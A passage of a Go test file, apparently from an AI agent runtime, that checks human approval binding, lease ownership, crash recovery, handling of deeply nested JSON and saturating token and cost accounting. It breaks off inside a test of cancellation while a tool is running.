package agentrt

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

func memStore(t *testing.T) *Store {
	t.Helper()
	st, err := OpenStore(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	return st
}

func mustDriver(t *testing.T, cfg Config) *Driver {
	t.Helper()
	if cfg.Policy == nil {
		cfg.Policy = DefaultPolicy()
	}
	d, err := NewDriver(cfg)
	if err != nil {
		t.Fatal(err)
	}
	return d
}

func objectTool(name string, se SideEffect) *stubTool {
	return &stubTool{spec: ToolSpec{Name: name, Description: name, InputSchema: []byte(`{"type":"object"}`), SideEffect: se, Timeout: time.Second}}
}

// nested is an object whose value nests n levels in all.
func nested(n int) string {
	return `{"x":` + strings.Repeat("[", n-1) + strings.Repeat("]", n-1) + `}`
}

// JSON nested near encoding/json's limit passes json.Valid but fails once
// the runtime wraps it: on Go 1.27 the wrapper would not encode, and the
// call ran with its record replaced by an error message; on Go 1.26 the
// stored row would not decode. It is refused where it enters instead:
// arguments and a result as an invalid decision, tool content as a
// tool_error keeping the bytes, and a capability or a reconciliation's
// result by failing the run before anything executes.
func TestDriver_DeepJSONIsRefusedWhereItEnters(t *testing.T) {
	ctx := context.Background()
	deep := nested(10000)
	t.Run("arguments and result", func(t *testing.T) {
		st := memStore(t)
		write := objectTool("write", LocalMutation)
		agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "write", Args: []byte(deep)}, {Kind: DecideComplete, Result: []byte(deep)}, {Kind: DecideComplete}}}
		run, err := mustDriver(t, Config{Store: st, Agent: agent, Tools: []Tool{write}}).Start(ctx, "g", leaseLimits())
		if err != nil || run.Status != StatusCompleted || write.calls != 0 {
			t.Fatalf("run %s %s, %v, %d calls", run.Status, run.ReasonDetail, err, write.calls)
		}
		steps, err := st.ListSteps(ctx, run.ID)
		if err != nil {
			t.Fatal(err)
		}
		if s := steps[0]; s.Observation.Kind != ObserveInvalidDecision || !strings.Contains(s.Observation.Summary, "nested deeper") || s.Decision.InvalidArgs != deep || s.Decision.Tool != "write" {
			t.Fatalf("step 0 = %+v", s.Observation)
		}
		if s := steps[1]; s.Observation.Kind != ObserveInvalidDecision || s.Decision.InvalidResult != deep {
			t.Fatalf("step 1 = %+v", s.Observation)
		}
	})
	t.Run("tool content", func(t *testing.T) {
		st := memStore(t)
		calls := 0
		read := funcTool{objectTool("read", ReadOnly).spec, func(ToolCall) (ToolResult, error) {
			calls++
			return ToolResult{Content: []byte(deep)}, nil
		}}
		agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "read", Args: []byte(`{}`)}, {Kind: DecideComplete}}}
		run, err := mustDriver(t, Config{Store: st, Agent: agent, Tools: []Tool{read}}).Start(ctx, "g", leaseLimits())
		if err != nil || run.Status != StatusCompleted || calls != 1 {
			t.Fatalf("run %s, %v, %d calls", run.Status, err, calls)
		}
		steps, err := st.ListSteps(ctx, run.ID)
		if err != nil {
			t.Fatal(err)
		}
		var content map[string]string
		json.Unmarshal(steps[0].Observation.Content, &content)
		if steps[0].Observation.Kind != ObserveToolError || content["content"] != deep || content["failure"] != "invalid_content" {
			t.Fatalf("step 0 = %s %.80s", steps[0].Observation.Kind, steps[0].Observation.Content)
		}
	})
	t.Run("capability", func(t *testing.T) {
		st := memStore(t)
		push := objectTool("push", RemoteMutation)
		policy := PolicyFunc(func(context.Context, ToolRequest, RunView) (PolicyDecision, error) {
			return PolicyDecision{Outcome: RequireApproval, Kind: "k", Capability: []byte(deep)}, nil
		})
		agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "push", Args: []byte(`{}`)}}}
		run, err := mustDriver(t, Config{Store: st, Agent: agent, Policy: policy, Tools: []Tool{push}}).Start(ctx, "g", leaseLimits())
		if err != nil || run.Status != StatusFailed || run.Reason != ReasonInternalError || push.calls != 0 {
			t.Fatalf("run %s/%s, %v", run.Status, run.Reason, err)
		}
		if approvals, _ := st.ListApprovals(ctx, run.ID); len(approvals) != 0 {
			t.Fatalf("approvals = %+v", approvals)
		}
	})
	t.Run("reconciliation result", func(t *testing.T) {
		st := memStore(t)
		interruptedRun(t, st)
		d := mustDriver(t, Config{Store: st, Agent: &listAgent{}, Tools: []Tool{objectTool("publish", RemoteMutation)},
			Reconcile: func(context.Context, RunView) (Reconciliation, error) {
				return Reconciliation{Outcome: ReconcileCompleted, Result: []byte(deep)}, nil
			}})
		run, err := d.Resume(ctx, "r1")
		if err != nil || run.Status != StatusFailed || run.Reason != ReasonInternalError {
			t.Fatalf("run %s/%s, %v", run.Status, run.Reason, err)
		}
	})
}

// oldApprovalHash is approvalHash as it was: a request that would not
// encode was hashed as the error message that replaced it, the same for
// every such request.
func oldApprovalHash(kind string, capability, presentation json.RawMessage, req ToolRequest) string {
	b, err := json.Marshal(map[string]any{"kind": kind, "capability": orEmptyObject(capability), "presentation": orEmptyObject(presentation), "request": req})
	if err != nil {
		b, _ = json.Marshal(map[string]string{"marshal_error": err.Error()})
	}
	return contentHash(b)
}

// waitingRun stores a run waiting on one approval for step s0.
func waitingRun(t *testing.T, st *Store, runID string, a Approval, limits Limits) {
	t.Helper()
	ctx := context.Background()
	now := time.Now()
	run := Run{ID: runID, Goal: "g", Status: StatusWaitingForApproval, Limits: limits, StepCount: 1, CreatedAt: now, StartedAt: now}
	step := Step{ID: "s0", RunID: runID, Index: 0, Status: StepAwaitingApproval, Decision: &Decision{Kind: DecideToolCall, Tool: a.Request.Spec.Name, Args: a.Request.Args}, StartedAt: now}
	if err := st.tx(ctx, nil, func(t *txn) error {
		if err := t.insertRun(ctx, run); err != nil {
			return err
		}
		if err := t.insertStep(ctx, step); err != nil {
			return err
		}
		return t.insertApproval(ctx, a)
	}); err != nil {
		t.Fatal(err)
	}
}

// An approval stored with the hash of an encoding error, which every
// unencodable request shared, is refused by Approve and by Resume with
// ErrApprovalHash: it binds nothing. The request is then executed by no
// tool, whatever is registered under its name now.
func TestApproval_HashOfAnEncodingErrorIsRefused(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	destroy := objectTool("post", Destructive)
	req := ToolRequest{RunID: "r1", StepID: "s0", Spec: objectTool("post", RemoteMutation).spec, Args: json.RawMessage(nested(9999))}
	a := Approval{ID: "a1", RunID: "r1", StepID: "s0", Kind: "remote_mutation", Capability: []byte(`{}`), Presentation: []byte(`{}`), Request: req, Status: ApprovalPending, CreatedAt: time.Now()}
	a.Hash = oldApprovalHash(a.Kind, a.Capability, a.Presentation, a.Request)
	waitingRun(t, st, "r1", a, leaseLimits())
	if err := Approve(ctx, st, nil, "r1", "a1", "joey", ""); !errors.Is(err, ErrApprovalHash) {
		t.Fatalf("Approve: %v, want ErrApprovalHash", err)
	}
	if _, err := st.DB().Exec(`UPDATE approvals SET status = 'approved' WHERE id = 'a1'`); err != nil {
		t.Fatal(err)
	}
	pd, _ := NeedApproval("destructive", "fresh approval", map[string]any{"danger": true}, map[string]any{"warning": "deletes production"})
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{}, Tools: []Tool{destroy},
		Policy: PolicyFunc(func(context.Context, ToolRequest, RunView) (PolicyDecision, error) { return pd, nil })})
	if _, err := d.Resume(ctx, "r1"); !errors.Is(err, ErrApprovalHash) {
		t.Fatalf("Resume: %v, want ErrApprovalHash", err)
	}
	if destroy.calls != 0 {
		t.Fatal("executed under an approval that binds nothing")
	}
}

// A row that will not decode, as one written nested past the decoder's
// limit, no longer makes its run unreadable: it is listed with its
// DecodeError, Resume fails the run as internal_error instead of wedging,
// an approval that will not decode cannot be decided, and Cancel closes
// the run.
func TestStore_UndecodableRowsDoNotWedgeTheRun(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	poison := `{"kind":"tool_call","tool":"work","args":` + nested(10001) + `}`
	now := formatTime(time.Now())
	for _, q := range []string{
		`INSERT INTO runs (id, goal, status, limits_json, step_count, created_at) VALUES ('r1', 'g', 'RUNNING', '{"max_steps":5,"max_consecutive_tool_failures":3,"loop_threshold":3}', 1, '` + now + `')`,
		`INSERT INTO steps (id, run_id, idx, status, decision_json, started_at) VALUES ('s0', 'r1', 0, 'executing', '` + poison + `', '` + now + `')`,
		`INSERT INTO runs (id, goal, status, limits_json, step_count, created_at) VALUES ('r2', 'g', 'WAITING_FOR_APPROVAL', '{"max_steps":5,"max_consecutive_tool_failures":3,"loop_threshold":3}', 1, '` + now + `')`,
		`INSERT INTO steps (id, run_id, idx, status, decision_json, started_at) VALUES ('s1', 'r2', 0, 'awaiting_approval', '{"kind":"tool_call","tool":"work","args":{}}', '` + now + `')`,
		`INSERT INTO approvals (id, run_id, step_id, kind, capability_json, presentation_json, request_json, hash, status, created_at) VALUES ('a1', 'r2', 's1', 'k', '{}', '{}', '{"args":` + nested(10001) + `}', 'h', 'pending', '` + now + `')`,
	} {
		if _, err := st.DB().Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	steps, err := st.ListSteps(ctx, "r1")
	if err != nil || len(steps) != 1 || steps[0].DecodeError == "" || steps[0].Decision != nil || steps[0].Status != StepExecuting {
		t.Fatalf("ListSteps: %+v, %v", steps, err)
	}
	approvals, err := st.ListApprovals(ctx, "r2")
	if err != nil || len(approvals) != 1 || approvals[0].DecodeError == "" {
		t.Fatalf("ListApprovals: %+v, %v", approvals, err)
	}
	work := objectTool("work", LocalMutation)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{}, {Kind: DecideComplete}}}, Tools: []Tool{work}})
	run, err := d.Resume(ctx, "r1")
	if err != nil || run.Status != StatusFailed || run.Reason != ReasonInternalError || work.calls != 0 {
		t.Fatalf("Resume: %s/%s %v, %d calls", run.Status, run.Reason, err, work.calls)
	}
	var column string
	st.DB().QueryRow(`SELECT decision_json FROM steps WHERE id = 's0'`).Scan(&column)
	if column != poison {
		t.Fatal("failing the run rewrote the damaged column")
	}
	if err := Approve(ctx, st, nil, "r2", "a1", "joey", ""); !errors.Is(err, ErrApprovalHash) {
		t.Fatalf("Approve of an undecodable approval: %v", err)
	}
	if err := Cancel(ctx, st, nil, "r2", "joey", "stuck"); err != nil {
		t.Fatalf("Cancel: %v", err)
	}
	if r, _ := st.GetRun(ctx, "r2"); r.Status != StatusCancelled {
		t.Fatalf("r2 is %s", r.Status)
	}
}

// grantAndPending stores a step with an approved grant followed by a
// pending approval, as a step paused again leaves it.
func grantAndPending(t *testing.T, st *Store, spec ToolSpec) {
	t.Helper()
	ctx := context.Background()
	mk := func(id string, status ApprovalStatus, args string) Approval {
		req := ToolRequest{RunID: "r1", StepID: "s0", Spec: spec, Args: json.RawMessage(args)}
		pd, _ := DefaultPolicy().Evaluate(ctx, req, RunView{})
		a := Approval{ID: id, RunID: "r1", StepID: "s0", Kind: pd.Kind, Capability: pd.Capability, Presentation: pd.Presentation, Request: req, Status: status, CreatedAt: time.Now()}
		if status == ApprovalApproved {
			a.DecidedAt, a.DecidedBy = time.Now(), "joey"
		}
		a.Hash, _ = approvalHash(a.Kind, a.Capability, a.Presentation, a.Request)
		return a
	}
	waitingRun(t, st, "r1", mk("old", ApprovalApproved, `{"n":1}`), leaseLimits())
	if err := st.tx(ctx, nil, func(t *txn) error { return t.insertApproval(ctx, mk("new", ApprovalPending, `{"n":1}`)) }); err != nil {
		t.Fatal(err)
	}
}

// Only a step's latest approval can be a grant. With a pending approval
// after an approved one, Resume returns ErrRunState and changes nothing,
// however often it is called; approving the pending one lets it run.
func TestResume_OnlyTheLatestApprovalOfAStepGrants(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	publish := objectTool("publish", RemoteMutation)
	grantAndPending(t, st, publish.spec)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{}, {Kind: DecideComplete}}}, Tools: []Tool{publish}})
	before := snapshot(t, st, "r1")
	for range 3 {
		if _, err := d.Resume(ctx, "r1"); !errors.Is(err, ErrRunState) {
			t.Fatalf("Resume with the latest approval pending: %v", err)
		}
	}
	if after := snapshot(t, st, "r1"); after != before || publish.calls != 0 {
		t.Fatalf("a refused resume changed the run (%d calls):\n before %s\n after  %s", publish.calls, before, after)
	}
	if err := d.Approve(ctx, "r1", "new", "joey", ""); err != nil {
		t.Fatal(err)
	}
	if run, err := d.Resume(ctx, "r1"); err != nil || run.Status != StatusCompleted || publish.calls != 1 {
		t.Fatalf("Resume after approving: %s %v, %d calls", run.Status, err, publish.calls)
	}
}

// A policy that asks for a different approval at resume pauses the step
// again; resuming before that approval is decided neither executes on the
// older grant nor adds another approval.
func TestResume_RepausedStepDoesNotPileUpApprovals(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	post := objectTool("post", RemoteMutation)
	shown := "v1"
	policy := PolicyFunc(func(_ context.Context, req ToolRequest, _ RunView) (PolicyDecision, error) {
		return NeedApproval("k", "r", map[string]any{"args": req.Args}, map[string]any{"text": shown})
	})
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "post", Args: []byte(`{"a":1}`)}, {Kind: DecideComplete}}}, Policy: policy, Tools: []Tool{post}})
	run, _ := d.Start(ctx, "g", leaseLimits())
	approvals, _ := st.ListApprovals(ctx, run.ID)
	if err := d.Approve(ctx, run.ID, approvals[0].ID, "joey", ""); err != nil {
		t.Fatal(err)
	}
	shown = "v2"
	if got, err := d.Resume(ctx, run.ID); err != nil || got.Status != StatusWaitingForApproval {
		t.Fatalf("re-pause: %s %v", got.Status, err)
	}
	for range 3 {
		if _, err := d.Resume(ctx, run.ID); !errors.Is(err, ErrRunState) {
			t.Fatalf("Resume before the new approval: %v", err)
		}
	}
	approvals, _ = st.ListApprovals(ctx, run.ID)
	if len(approvals) != 2 || approvals[1].Status != ApprovalPending || post.calls != 0 {
		t.Fatalf("approvals %d, %d calls", len(approvals), post.calls)
	}
}

// A step whose approved execution was interrupted and then paused again by
// reconciliation keeps its old grant on record, but a plain Resume does
// not execute on it: the pending approval is the step's latest.
func TestResume_ReconciledRepauseLeavesNoOldGrantUsable(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	publish := objectTool("publish", RemoteMutation)
	grantAndPending(t, st, publish.spec)
	// The grant was consumed: the step ran and the process died.
	st.DB().Exec(`DELETE FROM approvals WHERE id = 'new'`)
	st.DB().Exec(`UPDATE runs SET status = 'RUNNING' WHERE id = 'r1'`)
	st.DB().Exec(`UPDATE steps SET status = 'executing' WHERE id = 's0'`)
	pause := PolicyDecision{Outcome: RequireApproval, Kind: "republish", Capability: []byte(`{"tool":"publish"}`), Presentation: []byte(`{"why":"outcome unknown"}`)}
	rd := mustDriver(t, Config{Store: st, Agent: &listAgent{}, Tools: []Tool{publish},
		Reconcile: func(context.Context, RunView) (Reconciliation, error) {
			return Reconciliation{Outcome: ReconcileWaiting, Pause: &pause}, nil
		}})
	if run, err := rd.Resume(ctx, "r1"); err != nil || run.Status != StatusWaitingForApproval {
		t.Fatalf("reconciling resume: %s %v", run.Status, err)
	}
	plain := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{}, {Kind: DecideComplete}}}, Tools: []Tool{publish}})
	if _, err := plain.Resume(ctx, "r1"); !errors.Is(err, ErrRunState) || publish.calls != 0 {
		t.Fatalf("plain resume: %v, %d calls", err, publish.calls)
	}
}

type usageModel struct {
	calls  atomic.Int32
	usage  Usage
	served bool
	// err, when set, is the served error's cause, as an adapter reports
	// usage it could not read.
	err error
}

func (m *usageModel) Name() string { return "m" }
func (m *usageModel) Generate(context.Context, ModelRequest) (ModelResponse, error) {
	m.calls.Add(1)
	if m.served {
		cause := m.err
		if cause == nil {
			cause = errors.New("unusable reply")
		}
		return ModelResponse{}, ServedError{Usage: m.usage, Err: cause}
	}
	return ModelResponse{Text: "ok", Usage: m.usage}, nil
}

// twoCalls asks the model twice in one step, then completes.
type twoCalls struct{}

func (twoCalls) Decide(ctx context.Context, in StepInput) (Decision, error) {
	for range 2 {
		if _, err := in.Model.Generate(ctx, ModelRequest{MaxOutputTokens: 100}); err != nil {
			return Decision{}, err
		}
	}
	return Decision{Kind: DecideComplete}, nil
}

// Usage with a negative count, or more cached input than input, would
// lower the totals and so disarm the token and cost limits, and usage an
// adapter could not read at all says nothing of the cost. Neither is
// charged as reported: the attempt is recorded as an error naming why, charged the
// conservative estimate, and not retried, and the reply is not used.
func TestModel_UnusableUsageIsChargedTheEstimate(t *testing.T) {
	prices := PriceTable{"m": {InputPerMTok: 3_000_000, OutputPerMTok: 15_000_000}}
	for name, m := range map[string]*usageModel{
		"negative input":      {usage: Usage{InputTokens: -1_000_000}},
		"negative output":     {usage: Usage{InputTokens: 10, OutputTokens: -5}},
		"cached above input":  {usage: Usage{InputTokens: 10, CachedInputTokens: 1_000_000}},
		"served and negative": {usage: Usage{InputTokens: -7}, served: true},
		// An adapter that could not read the counts (an overflowing or
		// non-integer one) reports zero usage wrapping ErrUnusableUsage.
		"unusable per the adapter": {served: true, err: fmt.Errorf("%w: prompt_tokens is 1e99, not a count", ErrUnusableUsage)},
	} {
		t.Run(name, func(t *testing.T) {
			st := memStore(t)
			d := mustDriver(t, Config{Store: st, Agent: twoCalls{}, Model: &ModelConfig{Model: m, Prices: prices, MaxRetries: 3, Backoff: time.Millisecond}})
			l := leaseLimits()
			l.MaxTotalTokens, l.MaxEstimatedCost = 1_000_000, 1_000_000
			run, err := d.Start(context.Background(), "g", l)
			if err != nil || run.Status != StatusFailed || run.Reason != ReasonModelUnavailable || m.calls.Load() != 1 {
				t.Fatalf("run %s/%s %v, %d model calls", run.Status, run.Reason, err, m.calls.Load())
			}
			calls, _ := st.ListModelCalls(context.Background(), run.ID)
			c := calls[0]
			if c.Status != CallError || !strings.Contains(c.Error, "unusable usage") || c.Usage.InputTokens <= 0 || c.Usage.OutputTokens != 100 || c.Cost != prices.cost("m", c.Usage) || c.Cost <= 0 {
				t.Fatalf("call = %+v", c)
			}
			if run.Usage != c.Usage || run.EstimatedCost != c.Cost {
				t.Fatalf("run totals %+v %d, call %+v %d", run.Usage, run.EstimatedCost, c.Usage, c.Cost)
			}
		})
	}
}

// Totals and costs saturate: usage at the top of int neither wraps the
// run's totals negative nor the cost, so the next call is refused by the
// limits it would have slipped under.
func TestModel_TotalsSaturateRatherThanWrap(t *testing.T) {
	st := memStore(t)
	m := &usageModel{usage: Usage{InputTokens: math.MaxInt, OutputTokens: math.MaxInt}}
	d := mustDriver(t, Config{Store: st, Agent: twoCalls{}, Model: &ModelConfig{Model: m, Prices: PriceTable{"m": {InputPerMTok: 3_000_000, OutputPerMTok: 15_000_000}}}})
	l := leaseLimits()
	l.MaxTotalTokens = 1_000_000
	run, err := d.Start(context.Background(), "g", l)
	if err != nil || run.Status != StatusFailed || run.Reason != ReasonLimitTokens || m.calls.Load() != 1 {
		t.Fatalf("run %s/%s %v, %d model calls", run.Status, run.Reason, err, m.calls.Load())
	}
	if run.Usage.InputTokens != math.MaxInt || run.Usage.OutputTokens != math.MaxInt || run.EstimatedCost != math.MaxInt64 {
		t.Fatalf("totals %+v, cost %d", run.Usage, run.EstimatedCost)
	}
	if c := (PriceTable{"m": {InputPerMTok: 3_000_000}}).cost("m", Usage{InputTokens: 1_000_000}); c != 3_000_000 {
		t.Fatalf("an ordinary cost changed: %d", c)
	}
}

// A configured LeaseOwner names a driver but does not identify it: two
// drivers given the same name, as two replicas of one service, hold two
// different leases, so the second is refused while the first executes.
func TestLease_SameLeaseOwnerNameIsTwoOwners(t *testing.T) {
	path := filepath.Join(t.TempDir(), "l.db")
	work := newGate("work")
	agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "work", Args: []byte(`{}`)}, {Kind: DecideComplete}}}
	p1 := openProcess(t, path, Config{Agent: agent, Tools: []Tool{work}, LeaseOwner: "worker"})
	p2 := openProcess(t, path, Config{Agent: agent, Tools: []Tool{work}, LeaseOwner: "worker"})
	done := make(chan result, 1)
	go func() { r, err := p1.d.Start(context.Background(), "g", leaseLimits()); done <- result{r, err} }()
	runID := <-work.entered
	owner, _ := storedLease(t, p1.store, runID)
	if !strings.HasPrefix(owner, "worker/") || owner == p2.d.terms.owner {
		t.Fatalf("stored owner %q, second driver %q", owner, p2.d.terms.owner)
	}
	if _, err := p2.d.Resume(context.Background(), runID); !errors.As(err, new(ErrRunLeased)) {
		t.Fatalf("second driver's resume: %v", err)
	}
	close(work.release)
	if r := <-done; r.err != nil || r.run.Status != StatusCompleted || work.calls.Load() != 1 {
		t.Fatalf("first: %s %v, %d calls", r.run.Status, r.err, work.calls.Load())
	}
}

// One driver executing a run refuses a second Start or Resume of it
// rather than taking over the lease it holds itself.
func TestLease_OneDriverRefusesASecondCallOnItsRun(t *testing.T) {
	path := filepath.Join(t.TempDir(), "l.db")
	work := newGate("charge")
	agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "charge", Args: []byte(`{}`)}, {Kind: DecideComplete}}}
	p := openProcess(t, path, Config{Agent: agent, Tools: []Tool{work}})
	done := make(chan result, 1)
	go func() {
		r, err := p.d.StartWithID(context.Background(), "r1", "g", leaseLimits())
		done <- result{r, err}
	}()
	<-work.entered
	var leased ErrRunLeased
	if _, err := p.d.Resume(context.Background(), "r1"); !errors.As(err, &leased) || leased.Owner != p.d.terms.owner {
		t.Fatalf("second call's Resume: %v", err)
	}
	if _, err := p.d.StartWithID(context.Background(), "r1", "g", leaseLimits()); !errors.As(err, new(ErrRunLeased)) {
		t.Fatalf("second call's Start: %v", err)
	}
	close(work.release)
	if r := <-done; r.err != nil || r.run.Status != StatusCompleted || work.calls.Load() != 1 {
		t.Fatalf("first call: %s %v, %d calls", r.run.Status, r.err, work.calls.Load())
	}
}

// A driver resuming a run whose lease it held itself and let expire, as
// after a crash of the call that held it, records the takeover like any
// other.
func TestLease_OwnExpiredLeaseTakeoverIsRecorded(t *testing.T) {
	st := memStore(t)
	interruptedRun(t, st)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{}, {Kind: DecideComplete}}}, Tools: []Tool{objectTool("publish", ReadOnly)}})
	st.DB().Exec(`UPDATE runs SET lease_owner = ?, lease_expires_at = ? WHERE id = 'r1'`, d.terms.owner, formatTime(time.Now().Add(-time.Second)))
	if run, err := d.Resume(context.Background(), "r1"); err != nil || run.Status != StatusCompleted {
		t.Fatalf("resume: %s %v", run.Status, err)
	}
	events, _ := st.ListEvents(context.Background(), "r1")
	if len(events) == 0 || events[0].Type != EventLeaseTakenOver {
		t.Fatalf("events = %v", events)
	}
}

// A consumer holding the store's connection, with rows it has not closed,
// no longer starves the heartbeat: it renews on its own connection, and
// another process is refused for as long as the loop is alive.
func TestLease_HeldConnectionDoesNotStarveTheHeartbeat(t *testing.T) {
	path := filepath.Join(t.TempDir(), "l.db")
	const ttl = 150 * time.Millisecond
	work := newGate("sync")
	agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "sync", Args: []byte(`{}`)}, {Kind: DecideComplete}}}
	a := openProcess(t, path, Config{Agent: agent, Tools: []Tool{work}, LeaseTTL: ttl})
	b := openProcess(t, path, Config{Agent: agent, Tools: []Tool{work}, LeaseTTL: ttl})
	done := make(chan result, 1)
	go func() { r, err := a.d.Start(context.Background(), "g", leaseLimits()); done <- result{r, err} }()
	runID := <-work.entered
	rows, err := a.store.DB().Query(`SELECT id FROM runs`)
	if err != nil {
		t.Fatal(err)
	}
	for range 8 {
		time.Sleep(ttl / 2)
		if _, err := b.d.Resume(context.Background(), runID); !errors.As(err, new(ErrRunLeased)) {
			t.Fatalf("another process resumed a live run: %v", err)
		}
	}
	rows.Close()
	close(work.release)
	if r := <-done; r.err != nil || r.run.Status != StatusCompleted || work.calls.Load() != 1 {
		t.Fatalf("first: %s %v, %d calls", r.run.Status, r.err, work.calls.Load())
	}
}

// A loop whose stored lease has lapsed by the wall clock starts no tool
// and sends no model request, even though nobody has taken the run over
// and its own view of the lease says it is live.
func TestLease_LapsedLeaseStartsNoSideEffect(t *testing.T) {
	ctx := context.Background()
	lapse := func(st *Store, runID string) {
		st.DB().Exec(`UPDATE runs SET lease_expires_at = ? WHERE id = ?`, formatTime(time.Now().Add(-time.Second)), runID)
	}
	t.Run("tool", func(t *testing.T) {
		p := openProcess(t, filepath.Join(t.TempDir(), "l.db"), Config{Tools: []Tool{objectTool("write", LocalMutation)}, Agent: &scenarioAgent{}})
		write := p.d.tools["write"].(*stubTool)
		p.d.noHeartbeat = true
		p.d.agent = &scenarioAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "write", Args: []byte(`{}`)}}, hook: func(in StepInput) { lapse(p.store, in.Run.ID) }}
		if _, err := p.d.Start(ctx, "g", leaseLimits()); !errors.Is(err, ErrLeaseLost) || write.calls != 0 {
			t.Fatalf("Start: %v, %d calls", err, write.calls)
		}
	})
	t.Run("model", func(t *testing.T) {
		m := &countingModel{}
		var p process
		p = openProcess(t, filepath.Join(t.TempDir(), "l.db"), Config{Model: &ModelConfig{Model: m},
			Agent: modelThenComplete{before: func() {
				runs, _ := p.store.ListRuns(ctx)
				lapse(p.store, runs[0].ID)
			}}})
		p.d.noHeartbeat = true
		if _, err := p.d.Start(ctx, "g", leaseLimits()); !errors.Is(err, ErrLeaseLost) || m.calls.Load() != 0 {
			t.Fatalf("Start: %v, %d model calls", err, m.calls.Load())
		}
	})
}

// Without a reconciliation, a step interrupted while executing a tool
// that is not ReadOnly does not let the run continue, where the agent
// would ask for the same thing again: the run waits for an operator on
// that request. Approving runs it again, once, on the same step; rejecting
// ends the run with the tool never called again.
func TestResume_InterruptedSideEffectWaitsForAnOperator(t *testing.T) {
	ctx := context.Background()
	for _, approve := range []bool{true, false} {
		st := memStore(t)
		interruptedRun(t, st)
		publish := objectTool("publish", LocalMutation)
		agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "publish", Args: []byte(`{}`)}, {Kind: DecideComplete}}}
		d := mustDriver(t, Config{Store: st, Agent: agent, Tools: []Tool{publish}})
		run, err := d.Resume(ctx, "r1")
		if err != nil || run.Status != StatusWaitingForApproval || publish.calls != 0 {
			t.Fatalf("resume: %s %v, %d calls", run.Status, err, publish.calls)
		}
		approvals, _ := st.ListApprovals(ctx, "r1")
		if len(approvals) != 1 || approvals[0].Kind != InterruptedSideEffect || approvals[0].StepID != "s0" || !strings.Contains(string(approvals[0].Presentation), "outcome was recorded, so whether it took effect is unknown") {
			t.Fatalf("approvals = %+v", approvals)
		}
		if !approve {
			if err := d.Reject(ctx, "r1", approvals[0].ID, "joey", "done by hand"); err != nil {
				t.Fatal(err)
			}
			if got, _ := st.GetRun(ctx, "r1"); got.Status != StatusCancelled || publish.calls != 0 {
				t.Fatalf("rejected: %s, %d calls", got.Status, publish.calls)
			}
			continue
		}
		if err := d.Approve(ctx, "r1", approvals[0].ID, "joey", "run it again"); err != nil {
			t.Fatal(err)
		}
		run, err = d.Resume(ctx, "r1")
		if err != nil || run.Status != StatusCompleted || publish.calls != 1 {
			t.Fatalf("approved: %s %v, %d calls", run.Status, err, publish.calls)
		}
		steps, _ := st.ListSteps(ctx, "r1")
		if len(steps) != 2 || steps[0].Status != StepDone || steps[0].Observation.Kind != ObserveToolResult {
			t.Fatalf("steps = %+v", steps)
		}
	}
}

// A resume that marked the step interrupted and died before pausing it
// leaves the step interrupted with nothing after it. The next resume still
// knows the step was executing, and waits for the operator on it rather
// than letting the agent ask for it again.
func TestResume_InterruptedSideEffectSurvivesACrashAfterTheTakeover(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	interruptedRun(t, st)
	o := observation(ObserveInterrupted, map[string]string{"previous_status": string(StepExecuting)}, "step interrupted while executing")
	obs, _ := marshalOpt(&o)
	st.DB().Exec(`UPDATE steps SET status = 'interrupted', observation_json = ?, observation_hash = ? WHERE id = 's0'`, obs, o.ContentHash)
	publish := objectTool("publish", LocalMutation)
	agent := &listAgent{decisions: []Decision{{}, {Kind: DecideToolCall, Tool: "publish", Args: []byte(`{}`)}, {Kind: DecideComplete}}}
	run, err := mustDriver(t, Config{Store: st, Agent: agent, Tools: []Tool{publish}}).Resume(ctx, "r1")
	if err != nil || run.Status != StatusWaitingForApproval || publish.calls != 0 {
		t.Fatalf("resume: %s %v, %d calls", run.Status, err, publish.calls)
	}
	if approvals, _ := st.ListApprovals(ctx, "r1"); len(approvals) != 1 || approvals[0].StepID != "s0" || approvals[0].Kind != InterruptedSideEffect {
		t.Fatalf("approvals = %+v", approvals)
	}
}

// A ReadOnly tool interrupted while executing, and a step interrupted
// while deciding, continue as before: the next decision is the agent's.
func TestResume_InterruptedReadOnlyOrDecidingStepContinues(t *testing.T) {
	ctx := context.Background()
	for _, tc := range []struct {
		name string
		se   SideEffect
		step StepStatus
	}{{"read only", ReadOnly, StepExecuting}, {"deciding", Destructive, StepDeciding}} {
		st := memStore(t)
		interruptedRun(t, st)
		st.DB().Exec(`UPDATE steps SET status = ? WHERE id = 's0'`, tc.step)
		publish := objectTool("publish", tc.se)
		d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{}, {Kind: DecideComplete}}}, Tools: []Tool{publish}})
		if run, err := d.Resume(ctx, "r1"); err != nil || run.Status != StatusCompleted || publish.calls != 0 {
			t.Fatalf("%s: %s %v, %d calls", tc.name, run.Status, err, publish.calls)
		}
	}
}

// An operator's Cancel while a tool runs keeps the run cancelled and the
// step as Cancel wrote it, and the tool's real outcome is appended as a
// step.tool_finished event marked late.
func TestCancel_ToolOutcomeIsAppendedLate(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	work := funcTool{objectTool("transfer", LocalMutation).spec, func(c ToolCall) (ToolResult, error) {
